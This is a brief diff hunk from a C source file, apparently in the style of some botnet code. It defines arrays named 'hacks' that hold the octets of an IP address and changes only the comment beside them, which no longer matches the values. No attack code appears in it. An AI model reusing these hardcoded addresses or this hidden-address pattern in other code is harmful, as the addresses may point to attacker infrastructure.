@@ -40,7 +40,7 @@
 #define pad_z 2
 #define printbuf_len 12
 
-int hacks[] = {185}; //185.172.110.226
+int hacks[] = {185}; //45.61.53.150
 int hacks2[] = {172};
 int hacks3[] = {110};
 int hacks4[] = {226}; 
